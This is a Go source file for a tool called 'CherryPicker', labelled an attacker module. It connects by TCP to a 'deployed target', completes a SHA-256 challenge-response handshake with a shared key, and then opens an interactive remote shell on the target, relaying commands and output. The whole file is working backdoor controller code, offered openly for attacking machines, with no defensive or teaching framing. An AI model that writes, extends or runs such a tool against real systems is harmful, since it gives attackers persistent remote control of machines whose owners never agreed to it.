package main

import (
	"bufio"
	"crypto/sha256"
	"encoding/hex"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"strings"
	"time"
)

const attackerBanner = `
  ____ _                          ____  _      _             
 / ___| |__   ___ _ __ _ __ _   _|  _ \(_) ___| | _____ _ __ 
| |   | '_ \ / _ \ '__| '__| | | | |_) | |/ __| |/ / _ \ '__|
| |___| | | |  __/ |  | |  | |_| |  __/| | (__|   <  __/ |   
 \____|_| |_|\___|_|  |_|   \__, |_|   |_|\___|_|\_\___|_|   
                            |___/                             
[ATTACKER MODULE] - Connect to deployed targets
Version: 2.0.0
`

func main() {
	targetIP := flag.String("t", "", "Target IP address (required)")
	targetPort := flag.Int("p", 0, "Target port (required)")
	authKey := flag.String("s", "", "Authentication signature/key (required)")
	timeout := flag.Int("timeout", 10, "Connection timeout in seconds")
	flag.Parse()

	fmt.Println(attackerBanner)

	// Validate required arguments
	if *targetIP == "" {
		log.Fatal("[!] Error: -t is required\n\nUsage: ./cherrypicker-attacker -t <IP> -p <PORT> -s <SIGNATURE> [-timeout <SEC>]\n")
	}

	if *targetPort == 0 {
		log.Fatal("[!] Error: -p is required\n\nUsage: ./cherrypicker-attacker -t <IP> -p <PORT> -s <SIGNATURE> [-timeout <SEC>]\n")
	}

	if *targetPort < 1 || *targetPort > 65535 {
		log.Fatal("[!] Error: Port must be between 1 and 65535\n")
	}

	if *authKey == "" {
		log.Fatal("[!] Error: -s (signature) is required\n\nUsage: ./cherrypicker-attacker -t <IP> -p <PORT> -s <SIGNATURE> [-timeout <SEC>]\n")
	}

	log.Printf("[*] Connecting to %s:%d\n", *targetIP, *targetPort)
	log.Printf("[*] Timeout: %d seconds\n", *timeout)

	// Connect to target with timeout
	target := net.JoinHostPort(*targetIP, fmt.Sprintf("%d", *targetPort))
	conn, err := net.DialTimeout("tcp", target, time.Duration(*timeout)*time.Second)
	if err != nil {
		log.Fatalf("[!] Connection failed: %v\n", err)
	}
	defer conn.Close()

	log.Println("[+] Connected to target")

	// Perform authentication handshake
	if err := authenticate(conn, *authKey); err != nil {
		log.Fatalf("[!] Authentication failed: %v\n", err)
	}

	log.Println("[+] Authentication successful")
	log.Println("[+] Shell established. Type 'exit' to quit.\n")

	// Start interactive shell
	handleShell(conn)
}

// authenticate performs the authentication handshake with the target
func authenticate(conn net.Conn, key string) error {
	// Set timeout for authentication
	conn.SetDeadline(time.Now().Add(5 * time.Second))
	defer conn.SetDeadline(time.Time{})

	// Read challenge from target
	buf := make([]byte, 1024)
	n, err := conn.Read(buf)
	if err != nil {
		return fmt.Errorf("failed to read challenge: %w", err)
	}

	challenge := strings.TrimSpace(string(buf[:n]))
	if !strings.HasPrefix(challenge, "CHALLENGE:") {
		return fmt.Errorf("invalid challenge format")
	}

	challengeValue := strings.TrimPrefix(challenge, "CHALLENGE:")
	log.Printf("[*] Received challenge: %s\n", challengeValue)

	// Compute response: SHA256(challenge + key)
	response := sha256.Sum256([]byte(challengeValue + key))
	responseHex := hex.EncodeToString(response[:])

	// Send response
	_, err = conn.Write([]byte("RESPONSE:" + responseHex + "\n"))
	if err != nil {
		return fmt.Errorf("failed to send response: %w", err)
	}

	// Read authentication result
	n, err = conn.Read(buf)
	if err != nil {
		return fmt.Errorf("failed to read auth result: %w", err)
	}

	result := strings.TrimSpace(string(buf[:n]))
	if result != "AUTH_OK" {
		return fmt.Errorf("authentication rejected: %s", result)
	}

	return nil
}

// handleShell provides an interactive shell interface
func handleShell(conn net.Conn) {
	// Read from remote and print to stdout
	go func() {
		io.Copy(os.Stdout, conn)
		os.Exit(0)
	}()

	// Read from stdin and send to remote
	scanner := bufio.NewScanner(os.Stdin)
	for scanner.Scan() {
		line := scanner.Text()
		if _, err := conn.Write([]byte(line + "\n")); err != nil {
			log.Printf("[!] Send error: %v\n", err)
			return
		}
	}

	if err := scanner.Err(); err != nil {
		log.Printf("[!] Input error: %v\n", err)
	}
}
